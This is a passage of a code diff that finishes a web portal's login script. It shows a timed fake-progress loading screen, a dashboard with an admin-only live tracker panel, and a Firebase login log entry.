+                    document.getElementById("loginScreen").classList.add("hidden");
+                    
+                    // Show Loading Screen for 5 seconds
+                    const loader = document.getElementById("loadingScreen");
+                    loader.classList.remove("hidden");
+                    loader.classList.add("flex");
+
+                    // Fake percentage logic for visual effect
+                    const percentText = document.getElementById("loadingPercentage");
+                    let perc = 0;
+                    const interval = setInterval(() => {
+                        perc += Math.floor(Math.random() * 15) + 5;
+                        if(perc > 99) perc = 99;
+                        percentText.innerText = `${perc}% Synchronized...`;
+                    }, 500);
+
+                    setTimeout(() => {
+                        clearInterval(interval);
+                        // Hide Loading Screen
+                        loader.classList.add("hidden");
+                        loader.classList.remove("flex");
+
+                        // Show Dashboard
+                        const dash = document.getElementById("dashboardScreen");
+                        dash.classList.remove("hidden");
+                        dash.classList.add("flex");
+
+                        // Apply Role Logic
+                        if (currentUserRole === 'admin') {
+                            document.getElementById("liveTrackerPanel").classList.remove("hidden");
+                            startLiveTracking(); 
+                        } else {
+                            document.getElementById("liveTrackerPanel").classList.add("hidden");
+                            if (unsubscribeTracker) unsubscribeTracker(); 
+                        }
+                        
+                        renderData();
+                        logToFirebase("LOGIN", `${roleStr} logged into Database Portal`);
+                    }, 5000); // 5 seconds wait
+                } 
+                else {
+                    document.getElementById("errorMessage").classList.remove("hidden");
+                }
+            };
+
+            document.getElementById("logoutBtn").onclick = () => location.reload(); 
+        });
+    </script>
+</body>
+</html>
 
 
